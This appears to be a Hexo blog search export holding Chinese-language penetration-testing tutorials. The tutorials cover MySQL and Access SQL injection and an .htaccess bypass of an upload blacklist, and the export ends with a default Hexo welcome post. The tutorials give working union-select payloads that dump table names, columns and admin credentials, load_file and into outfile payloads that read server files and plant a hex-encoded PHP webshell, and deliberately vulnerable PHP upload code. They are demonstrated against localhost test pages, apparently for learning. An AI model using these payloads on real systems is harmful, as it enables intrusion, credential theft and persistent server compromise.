    <content><![CDATA[<h3 id="MySQL的一些特性"><a href="#MySQL的一些特性" class="headerlink" title="MySQL的一些特性"></a>MySQL的一些特性</h3><p>MySQL的注入比Access好玩得多，这是基于MySQL的特性而定的。看一下MySQL的一些特性：<br>●MySQL通常搭配PHP使用，所以PHP的网站一般都是使用MySQL数据库；<br>●MySQL的数据库文件通常存储在数据库安装路径下，后缀格式是myi，myd，frm；<br>●MySQL有管理员用户名和密码，超级用户是root；<br>●MySQL 5.0以上版本有information_schema数据库，存储着所有数据库下的表名和列名信息。<br>MySQL可以使用和Access一样的猜解方法，但我们通常不会这样做，因为MySQL可以暴力破解数据库的很多信息。</p>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>判断注入点需要具体情况具体分析，这里不做介绍。在这里使用我自己写的一个页面来演示。注入点是：<a href="http://localhost/test/injection.php?id=1" target="_blank" rel="noopener">http://localhost/test/injection.php?id=1</a><br><img src="http://static.zybuluo.com/xmy2017/490m31t8kx00cccg0v4eqr74/1.png" alt="1.png-17kB"> </p>
<h3 id="判断当前数据表列数"><a href="#判断当前数据表列数" class="headerlink" title="判断当前数据表列数"></a>判断当前数据表列数</h3><p>使用order by语句来判断当前数据表的列数，语句如下：</p>
<pre><code>order by N</code></pre>

<p>N是1，2，3…N，直到页面返回出错，那前面一个数字就是当前数据表的列数。<br>判断当前数据表的列数：<br><img src="http://static.zybuluo.com/xmy2017/gteaqk3s6zfq4hkvlh9bkefa/2.png" alt="2.png-41.6kB"><br>当前数据表的列数是7。<br>我们也可以使用union语句来判断当前数据表的列数，语句如下：</p>
<pre><code>and 1=2 union select 1,2,3…</code></pre>

<p>一直增加数字，返回的页面都是出错的，直到返回的页面看到一些数字为止：<br><img src="http://static.zybuluo.com/xmy2017/9y80j21sfuvdg4u7jf496eoh/3.png" alt="3.png-17.1kB"><br>我们可以看到2，5，6这三个奇怪的数字，这三个数字接下来很有用处。</p>
<h3 id="爆出MySQL的信息"><a href="#爆出MySQL的信息" class="headerlink" title="爆出MySQL的信息"></a>爆出MySQL的信息</h3><p>可以使用以下几个函数来爆出MySQL的一些信息：</p>
<pre><code>
database()                //爆出当前数据库名
version()                    //爆出数据库版本
user()                    //爆出当前用户
@@version_compile_os    //爆出操作系统
</code></pre>

<p>使用的方法是将这些函数替换上面爆出来的一些数字，如下：<br><img src="http://static.zybuluo.com/xmy2017/zx54edpsrllnvv0p8n7eyefh/4.png" alt="4.png-21.2kB"><br>我们可以看到，当前数据库名是bookinfo，用户是root，这是超级用户，操作系统是Windows。</p>
<h3 id="爆出当前数据库的所有表"><a href="#爆出当前数据库的所有表" class="headerlink" title="爆出当前数据库的所有表"></a>爆出当前数据库的所有表</h3><p>爆出表和字段会用到information_schema这个数据库，语句如下：</p>
<pre><code>and 1=2 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=当前数据库名(编码)</code></pre>

<p>这里使用了group_concat这个函数，表示返回所有的表；information_schema.tables记录了所有数据库下所有表的信息。需要注意的是table_schema代表数据库名，需要进行十六进制编码。<br>爆出bookinfo这个数据库的所有表：<br><img src="http://static.zybuluo.com/xmy2017/jxfxsmvfosdbf70rtuyuq5yc/5.png" alt="5.png-23.6kB"><br>可以看到显示出了4个表，分别是admin，lend，user和yx_books。</p>
<h3 id="爆出列名信息"><a href="#爆出列名信息" class="headerlink" title="爆出列名信息"></a>爆出列名信息</h3><p>我们可以爆出某个数据库的的所有列名信息，语句如下：</p>
<pre><code>and 1=2 union select 1, group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name=表名（编码）</code></pre>

<p>information_shcema.columns记录了所有列名的信息，我们只需要指定表名就可以查询出具体某个表的列名信息，注意这里的表名需要进行十六进制编码。<br>爆出admin表的列名信息：<br><img src="http://static.zybuluo.com/xmy2017/4zgbd5p2qhnnnf179sldugdg/6.png" alt="6.png-25.4kB"></p>
<h3 id="爆出数据库的内容"><a href="#爆出数据库的内容" class="headerlink" title="爆出数据库的内容"></a>爆出数据库的内容</h3><p>爆出admin表的username和password这两列的内容，构造语句如下：</p>
<pre><code>and 1=2 union select 1,group_concat(username),3,4,group_concat(password),6,7 from admin</code></pre>

<p>不使用group_concat()函数只能查询出第一条记录。<br>查询结果如下：<br> <img src="http://static.zybuluo.com/xmy2017/v162v35b8slhbtza0v8h2d2d/7.png" alt="7.png-25.8kB"></p>
<h3 id="读取文件信息"><a href="#读取文件信息" class="headerlink" title="读取文件信息"></a>读取文件信息</h3><p>如果存在注入点，而且当前用户是root，MySQL的注入会变得好玩很多，比如我们可以试着读取某些文件的内容。读取文件用到load_file()函数，这个函数必须使用文件的绝对路径，所以在使用时我们必须想办法知道想要读取文件的路径。文件读取的语句如下：</p>
<pre><code>and 1=2 union select 1,load_file(‘文件路径’),3,4,5,6,7</code></pre>

<p>我们知道服务器的操作系统是Windows，试着读取hosts文件的内容：<br><img src="http://static.zybuluo.com/xmy2017/6ezasaqd49h23rzr85h2u134/8.png" alt="8.png-62.9kB"><br>读取成功！注意路径的分隔符用的是“\\”，也可以使用“/”。但是不要使用“\”，因为“\”在编程里面常用于转义，后面接一些字符会出现问题。</p>
<h3 id="写入文件信息"><a href="#写入文件信息" class="headerlink" title="写入文件信息"></a>写入文件信息</h3><p>我们还可以直接写入一句话代码，如果目录有写入权限的话。写入文件使用的是into outfile函数。写入文件时也需要知道网站的绝对路径，否则写进去也无法成功访问。写入的语句如下：</p>
<pre><code>and 1=2 union select 1,写入内容的十六进制编码，3,4,5,6,7 into outfile ‘写入文件路径’</code></pre>

<p>我们在“D:\phpstudy\www\test”下写入php一句话木马：<br> <img src="http://static.zybuluo.com/xmy2017/tzhtvlgr1jedp3taih44ojhk/9.png" alt="9.png-32.2kB"><br>页面报错了，不过实际上写入成功了。注意我们对php一句话的内容进行了十六进制编码，这样可以绕过一些防护软件或者转义限制。hack.php的内容如下：<br> <img src="http://static.zybuluo.com/xmy2017/h6dgkopiddcmrukdsycx7wy0/10.png" alt="10.png-4kB"><br>然后就可以直接上菜刀了：<br><img src="http://static.zybuluo.com/xmy2017/s41pwliitle1skeeej7t1a62/11.png" alt="11.png-43.2kB"></p>
<h3 id="魔术引号问题"><a href="#魔术引号问题" class="headerlink" title="魔术引号问题"></a>魔术引号问题</h3><p>root权限虽然可以使用load_file()和into outfile对文件进行读取和写入，但我们也会遇到无法读取和写入的情况。这些情况通常是由于对目录或者文件权限不够的原因引起的，但也有可能是魔术引号问题引起的。<br>魔术引号通常是指magic_quotes_gpc开关，当开关打开时，所有的GET、POST和COOKIE请求的数据中的单引号（’）、双引号（”）、反斜线（\）和NULL字符都会被自动加上一个反斜线进行转义，这和addslashes()函数的作用完全相同。魔术引号其实就是为了防止SQL注入而增加的功能。不过自PHP 5.4.0起这个功能就被移除了。<br>我们演示一下这个功能吧。在php.ini中开启魔术引号：<br><img src="http://static.zybuluo.com/xmy2017/fnugboqrpg7dnsua7vsjtv1u/12.png" alt="12.png-1.6kB"><br>我们读取一下hosts文件的内容：<br> <img src="http://static.zybuluo.com/xmy2017/v841j6cbzxyy7wr31zis6300/13.png" alt="13.png-55.3kB"><br>读不出来！为了方便，我把sql语句显示了出来。可以看到，前面加上了一个反斜线，导致路径出错了。<br>解决魔术引号问题的办法就是编码，将路径进行编码，注意编码的路径是不带单引号的：<br> <img src="http://static.zybuluo.com/xmy2017/g7l4npl403khne8t2v9a6lpf/14.png" alt="14.png-75.2kB"><br>顺利读取出来了。所以在进行读取和写入时，最好都进行编码。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Access注入</title>
    <url>/2020/01/13/Access%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="Access的一些特性"><a href="#Access的一些特性" class="headerlink" title="Access的一些特性"></a>Access的一些特性</h3><p>Access的一些特性如下：<br>●Aceess通常搭配ASP网站；<br>●Access的数据库文件存放在网站目录下（通常是database或者db目录），后缀格式通常是mdb（也可能是asp或者asa）。我们可以想办法下载数据库文件。<br>●Access数据库没有用户名和密码，也没有数据库名。</p>
<h3 id="Access手工注入"><a href="#Access手工注入" class="headerlink" title="Access手工注入"></a>Access手工注入</h3><p>Access注入的步骤通常如下：<br>（1）.判断注入点<br>（2）.猜解表名<br>（3）.猜解列名<br>（4）.猜解内容</p>
<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>判断注入点有很多种方法，要根据具体情况使用，所以这里也不详细解释。</p>
<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><p>Access的表名和列名都只能靠猜。表名的猜解使用exists函数，猜解语句如下：</p>
<pre><code>and exists(select * from 表名)</code></pre>

<p>如果返回正常，说明数据库中有这个表。<br>猜解是否有user表：<br><img src="http://static.zybuluo.com/xmy2017/vanlgelocnslo0ks81eiccog/1.png" alt="1.png-34.6kB"><br>显示出错，说明没有user表。<br>猜解是否有admin表：<br><img src="http://static.zybuluo.com/xmy2017/lrve5pbr4w72pwac8njkahkp/2.png" alt="2.png-291.2kB"><br>很明显，有admin这个表。</p>
<h4 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h4><p>列名的猜解和表名一样，也是用exists函数。语句如下：</p>
<pre><code>and exists(select 列名 from 表名)</code></pre>

<p>返回正常，则说明有这个列。。<br>猜解是否有admin列：<br><img src="http://static.zybuluo.com/xmy2017/wyziikcfo4yhk4qjhs1yjj17/3.png" alt="3.png-296.1kB"><br>猜解是否有password列：<br><img src="http://static.zybuluo.com/xmy2017/bxjo7kb22it921jat49dxg2i/4.png" alt="4.png-293.6kB"></p>
<h4 id="猜解列的长度"><a href="#猜解列的长度" class="headerlink" title="猜解列的长度"></a>猜解列的长度</h4><p>猜解列的长度需要用到len函数，语句如下：</p>
<pre><code>and (select top 1 len(列名) from 表名)>num</code></pre>

<p>num是数字，可以是1，2，3……直到页面返回出错为止，则该值就是列的长度。这个语句只能猜解第一条记录的长度。<br>　　猜解admin列第一条记录的长度：<br><img src="http://static.zybuluo.com/xmy2017/r5t8h26jrbyphhljsgnvc6is/5.png" alt="5.png-50.1kB"><br>admin列第一条记录的长度是5。</p>
<h4 id="猜解列的内容"><a href="#猜解列的内容" class="headerlink" title="猜解列的内容"></a>猜解列的内容</h4><p>猜解列的内容用到两个函数mid和asc，mid(列名, N, 1)函数发截取第N位字符，asc(mid(列名, N, 1))函数取得第N位字符ascii码，ascii码对应的字符就是我们猜解出来的内容。语句如下：</p>
<pre><code>and select top 1 asc(mid(列名, N, 1) from 表名)>num</code></pre>

<p>num是ascii码，直到页面返回出错，则该值就是对应位置字符的ascii码。<br>猜解admin列第一条记录的第一个字符：<br><img src="http://static.zybuluo.com/xmy2017/d3ctniqkkfmbl3nh6kfdcz7m/6.png" alt="6.png-46.3kB"><br>由上面可知，admin列第一个值第一个字符对应的ascii码是97，则该字符为“a”，接下来的字符猜解方法是一样的。</p>
<h4 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h4><p>上面的方法在猜解列的内容时是十分麻烦的，我们可以使用union使猜解变得简单起来。<br>union是针对两个表的联合查询，使用union时两个表的列数和数据类型必须完全一致才能进行查询。<br>下面用实例说话，我们猜解当前表的列数，使用order by语句：</p>
<pre><code>order by num</code></pre>

<p>num是列的数量，直到页面返回不正常，那上一个正常的返回值就是列数。<br><img src="http://static.zybuluo.com/xmy2017/7zn74u4eps3pupbye4nul9fr/7.png" alt="7.png-32kB"><br>返回错误，由此可知当前表的列数是5。<br>使用union也可以猜解当前表的列数，语句是：</p>
<pre><code>and 1=2 union select 1,2,3…N from 表名</code></pre>

<p>使用and 1=2使第一条查询语句出错，union执行第二条查询语句，n是列数，由1，2，3一直往上加，直到页面出现数字为止。这里需要注意的是，后面的表名不是当前表的表名，而是你需要猜解的表名，而猜解出来的列数却是当前表的列数。<br><img src="http://static.zybuluo.com/xmy2017/ywex8phxnhkksiozd6shzw5l/8.png" alt="8.png-35.1kB"><br>从图中我们可以看到2和3这两个数字，这表示它显示的是当前表的第2列和第3列的查询结果。<br>我们利用上面得到的数字来进行暴表，语句如下：</p>
<pre><code>And 1=2 union select 1,列1,列2,3,4,5 from 表名</code></pre>

<p><img src="http://static.zybuluo.com/xmy2017/5otmxx3jnwaanuundbmdi3u7/9.png" alt="9.png-41.4kB"><br>看图，我们成功地将admin和password这两列的第一条记录暴出来了，是不是比上面使用的方法简单多了。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>.htaccess绕过黑名单上传</title>
    <url>/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<sup>[1]</sup><br>在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。<br>测试上传功能的代码如下：</p>
<pre><code class="php">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;&gt;
&lt;/form&gt;
&lt;?php 
$black_list = array(&#39;html&#39;, &#39;htm&#39;, &#39;php&#39;, &#39;php2&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;txt&#39;);
if(isset($_FILES[&#39;file&#39;]))
{
    $file_name = $_FILES[&#39;file&#39;][&#39;name&#39;];
    $file_path = &#39;images/&#39; . $file_name;
    $file_ext = substr($file_name, strrpos($file_name, &#39;.&#39;)+1);
    $file_tmp = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
    foreach($black_list as $key=&gt;$value)
    {
        if($value == strtolower($file_ext))
        {
            echo &quot;不允许上传的文件类型！&quot;;
            exit(0);
        }
    }

    if(!move_uploaded_file($file_tmp, $file_path))
    {
        echo &quot;文件上传失败！&quot;;
    }
    else
    {
        echo &quot;文件上传成功，文件路径为&quot; . $file_path;
    }
}
?&gt;</code></pre>
<p>新建.htaccess文件内容如下：</p>
<pre><code class="html">&lt;FilesMatch &quot;lala&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre>
<p>上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：<br><img src="http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png" alt="1.png-24.9kB"><br>接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：<br><img src="http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png" alt="2.png-25.2kB"><br>两个文件都能上传成功，使用菜刀连接lala文件：<br><img src="http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png" alt="3.png-75.3kB"><br>所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。</p>
<p>参考：<br>[1]百度百科：<a href="https://baike.baidu.com/item/htaccess/1645473" target="_blank" rel="noopener">https://baike.baidu.com/item/htaccess/1645473</a></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/01/11/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
